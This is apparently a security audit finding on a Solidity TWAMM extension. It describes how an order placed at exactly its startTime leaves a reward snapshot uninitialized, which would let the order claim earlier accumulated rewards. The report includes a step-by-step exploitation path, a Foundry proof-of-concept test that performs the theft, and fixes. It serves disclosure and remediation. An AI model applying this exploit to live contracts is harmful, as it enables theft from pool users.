## Title
Reward Rate Snapshot Uninitialized When Order Placed at Exact startTime - Theft of Accumulated Pool Rewards

## Summary
The `getRewardRateInside` function in TWAMM uses a strict greater-than check (`>`) at line 96 instead of greater-than-or-equal (`>=`) when determining if an order is active. When combined with the order placement logic that skips startTime registration for immediately-active orders, this causes `poolRewardRatesBeforeSlot(poolId, startTime)` to remain uninitialized (zero). Consequently, orders placed at exactly `block.timestamp == startTime` can claim rewards accumulated before they existed, stealing from the protocol and other orders.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/extensions/TWAMM.sol` - `getRewardRateInside()` function (lines 84-111) and `handleForwardData()` function (lines 190-384)

**Intended Logic:** 
The comment at line 99 states: "note that we check gt because if it's equal to start time, then the reward rate inside is necessarily 0". The function should return zero rewards at exactly startTime since no trading has occurred yet for that order. The `poolRewardRatesBeforeSlot` should store a snapshot of the reward rate at each time boundary to properly calculate rewards earned during an order's active period. [1](#0-0) 

**Actual Logic:**
When an order is placed with `startTime = block.timestamp` (immediate activation), three critical issues occur:

1. The condition `block.timestamp > config.startTime()` at line 96 is FALSE (they're equal), so `getRewardRateInside()` returns 0
2. The order placement logic at line 271 checks `if (block.timestamp < startTime)`, which is FALSE, so execution goes to the else block at line 274
3. The else block only registers `endTime` via `_updateTime()` but never registers `startTime`, meaning `poolRewardRatesBeforeSlot(poolId, startTime)` is never initialized and remains at its default value of 0 [2](#0-1) 

Later, when `block.timestamp > startTime`, the function reads the uninitialized `rewardRateStart` value: [3](#0-2) 

Since `rewardRateStart` was never written, it reads as 0, causing the calculation to return `rewardRateCurrent - 0 = rewardRateCurrent`, which includes ALL accumulated rewards since pool initialization, not just rewards since the order started.

**Exploitation Path:**
1. **Initial State:** A TWAMM pool has been operating with existing orders. The `poolRewardRatesSlot` has accumulated to value `R` over time (e.g., `R = 1000e18 << 128`)
2. **Attacker Action:** Attacker calls `Orders.mintAndIncreaseSellAmount()` with `startTime = block.timestamp` and a high `saleRate` value `S`
3. **State Corruption:** Order is created with `orderRewardRateSnapshot = 0`, and `poolRewardRatesBeforeSlot(poolId, startTime)` remains uninitialized at 0
4. **Exploit Execution:** After any time period (even 1 second), attacker calls `Orders.collectProceeds()`
5. **Theft Occurs:** `getRewardRateInside()` returns `rewardRateCurrent - 0` instead of `rewardRateCurrent - R`, and the attacker receives `purchasedAmount = (R * S) >> 128` tokens they never earned [4](#0-3) 

**Security Property Broken:** 
This violates the protocol's fee accounting invariant - rewards that accumulated from other orders' trading activity are incorrectly attributed to a newly placed order. This is effectively unauthorized theft of proceeds from the protocol and existing orders.

## Impact Explanation
- **Affected Assets:** All tokens in TWAMM pools where reward rates have accumulated over time. Both token0 and token1 reward rates are vulnerable independently.
- **Damage Severity:** An attacker can steal accumulated rewards proportional to `(accumulatedRewardRate * attackerSaleRate) >> 128`. For example, if a pool has accumulated `rewardRate = 1000e18 << 128` and attacker places an order with `saleRate = 1e18 << 32`, they steal approximately `1000e18` tokens. The maximum sale rate is `type(uint112).max`, enabling massive theft.
- **User Impact:** All existing TWAMM orders and liquidity providers lose rewards that should have been distributed to them. The attack drains the pool's saved balances, potentially causing insolvency if balances are insufficient to cover legitimate withdrawals.

## Likelihood Explanation
- **Attacker Profile:** Any unprivileged user can exploit this - only requires calling public functions on the Orders contract
- **Preconditions:** 
  - TWAMM pool must exist with non-zero accumulated reward rates
  - Attacker needs tokens to place an order (but can withdraw immediately after)
  - No trusted role permissions required
- **Execution Complexity:** Simple two-transaction attack: (1) place order at exact startTime, (2) collect proceeds after 1 second
- **Frequency:** Can be repeated continuously by any attacker. Multiple attackers can simultaneously exploit the same pool. Each exploitation drains more accumulated rewards.

## Recommendation

**Option 1 (Preferred):** Initialize `poolRewardRatesBeforeSlot` when order is placed at exactly startTime:

```solidity
// In src/extensions/TWAMM.sol, function handleForwardData, after line 224:

uint256 rewardRateInside = getRewardRateInside(poolId, orderKey.config);

// ADD THIS: If order is being placed at exactly startTime, initialize the snapshot
if (block.timestamp == startTime) {
    uint256 offset = LibBit.rawToUint(!orderKey.config.isToken1());
    uint256 rewardRateCurrent = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).add(offset).load());
    TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, startTime).add(offset).store(bytes32(rewardRateCurrent));
}
```

**Option 2 (Alternative):** Change the comparison operator to `>=`:

```solidity
// In src/extensions/TWAMM.sol, function getRewardRateInside, line 96:

// CURRENT:
} else if (block.timestamp > config.startTime()) {

// FIXED:
} else if (block.timestamp >= config.startTime()) {
    // This requires also initializing poolRewardRatesBeforeSlot in handleForwardData
```

However, Option 2 requires additional changes to ensure the snapshot is written before reading. **Option 1 is safer and more explicit.**

## Proof of Concept

```solidity
// File: test/Exploit_RewardRateTheft.t.sol
// Run with: forge test --match-test test_stealAccumulatedRewards -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";
import "./FullTest.sol";

contract Exploit_RewardRateTheft is FullTest {
    TWAMM internal twamm;
    Orders internal orders;
    
    function setUp() public override {
        FullTest.setUp();
        address deployAddress = address(uint160(twammCallPoints().toUint8()) << 152);
        deployCodeTo("TWAMM.sol", abi.encode(core), deployAddress);
        twamm = TWAMM(deployAddress);
        orders = new Orders(core, IExtension(address(twamm)));
    }
    
    function test_stealAccumulatedRewards() public {
        // SETUP: Create pool with existing orders to accumulate rewards
        uint64 fee = uint64((uint256(5) << 64) / 100);
        PoolKey memory poolKey = createPool(
            address(token0), 
            address(token1), 
            0, 
            createFullRangePoolConfig(fee, address(twamm))
        );
        
        // Add liquidity
        createPosition(poolKey, MIN_TICK, MAX_TICK, 1000e18, 1000e18);
        
        // Legitimate user places order in the past
        uint64 legitimateStartTime = uint64(((block.timestamp / 256) * 256));
        uint64 legitimateEndTime = legitimateStartTime + 1024;
        
        vm.warp(legitimateStartTime);
        
        token0.approve(address(orders), type(uint256).max);
        OrderKey memory legitKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee, 
                _isToken1: false, 
                _startTime: legitimateStartTime, 
                _endTime: legitimateEndTime
            })
        });
        
        orders.mintAndIncreaseSellAmount(legitKey, 100e18, type(uint112).max);
        
        // Time passes, rewards accumulate
        vm.warp(legitimateStartTime + 512);
        
        // Read accumulated reward rate (should be non-zero from legitimate order's trading)
        PoolId poolId = poolKey.toPoolId();
        uint256 rewardRateBefore = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
        
        console.log("Accumulated reward rate:", rewardRateBefore);
        assertGt(rewardRateBefore, 0, "Rewards should have accumulated");
        
        // EXPLOIT: Attacker places order at EXACT startTime
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);
        
        token0.mint(attacker, 100e18);
        token0.approve(address(orders), type(uint256).max);
        
        uint64 attackStartTime = uint64(block.timestamp); // EXACT current time
        uint64 attackEndTime = attackStartTime + 256;
        
        OrderKey memory attackKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee,
                _isToken1: false,
                _startTime: attackStartTime,
                _endTime: attackEndTime
            })
        });
        
        (uint256 attackOrderId,) = orders.mintAndIncreaseSellAmount(attackKey, 10e18, type(uint112).max);
        
        // Verify poolRewardRatesBeforeSlot was NOT initialized
        uint256 rewardRateSnapshot = uint256(
            TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, attackStartTime).load()
        );
        assertEq(rewardRateSnapshot, 0, "VULNERABILITY: Snapshot was not initialized!");
        
        // Wait minimal time
        vm.warp(attackStartTime + 1);
        
        // VERIFY: Attacker collects proceeds including stolen rewards
        uint256 balanceBefore = token1.balanceOf(attacker);
        orders.collectProceeds(attackOrderId, attackKey, attacker);
        uint256 stolenAmount = token1.balanceOf(attacker) - balanceBefore;
        
        vm.stopPrank();
        
        // The attacker received rewards from BEFORE their order existed
        console.log("Stolen amount:", stolenAmount);
        assertGt(stolenAmount, 0, "Attacker stole accumulated rewards!");
        
        // This demonstrates the attacker got credit for historical reward rates
        // that accumulated before their order was placed
    }
}
```

**Notes:**
- The vulnerability stems from the interaction between the `>` check at line 96 and the conditional startTime registration at line 271-298
- The comment at line 99 is technically correct that rewards should be 0 at exact startTime, but it fails to account for the uninitialized snapshot causing future incorrect calculations
- This is a critical architectural flaw in the reward accounting system that allows theft of accumulated protocol value
- The fix requires initializing `poolRewardRatesBeforeSlot(poolId, startTime)` when an order is placed at exactly `block.timestamp == startTime`

### Citations

**File:** src/extensions/TWAMM.sol (L96-106)
```text
        } else if (block.timestamp > config.startTime()) {
            uint256 offset = LibBit.rawToUint(!config.isToken1());

            //  note that we check gt because if it's equal to start time, then the reward rate inside is necessarily 0
            uint256 rewardRateStart =
                uint256(TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, config.startTime()).add(offset).load());
            uint256 rewardRateCurrent = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).add(offset).load());

            unchecked {
                result = rewardRateCurrent - rewardRateStart;
            }
```

**File:** src/extensions/TWAMM.sol (L271-298)
```text
                if (block.timestamp < startTime) {
                    _updateTime(poolId, startTime, saleRateDelta, isToken1, numOrdersChange);
                    _updateTime(poolId, endTime, -int256(saleRateDelta), isToken1, numOrdersChange);
                } else {
                    // we know block.timestamp < orderKey.endTime because we validate that first
                    // and we know the order is active, so we have to apply its delta to the current pool state
                    StorageSlot currentStateSlot = TWAMMStorageLayout.twammPoolStateSlot(poolId);
                    TwammPoolState currentState = TwammPoolState.wrap(currentStateSlot.load());
                    (uint32 lastTime, uint112 rate0, uint112 rate1) = currentState.parse();

                    if (isToken1) {
                        currentState = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: lastTime,
                            _saleRateToken0: rate0,
                            _saleRateToken1: uint112(addSaleRateDelta(rate1, saleRateDelta))
                        });
                    } else {
                        currentState = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: lastTime,
                            _saleRateToken0: uint112(addSaleRateDelta(rate0, saleRateDelta)),
                            _saleRateToken1: rate1
                        });
                    }

                    currentStateSlot.store(TwammPoolState.unwrap(currentState));

                    // only update the end time
                    _updateTime(poolId, endTime, -int256(saleRateDelta), isToken1, numOrdersChange);
```

**File:** src/extensions/TWAMM.sol (L359-361)
```text
                uint256 rewardRateInside = getRewardRateInside(poolId, orderKey.config);

                uint256 purchasedAmount = computeRewardAmount(rewardRateInside - rewardRateSnapshot, order.saleRate());
```
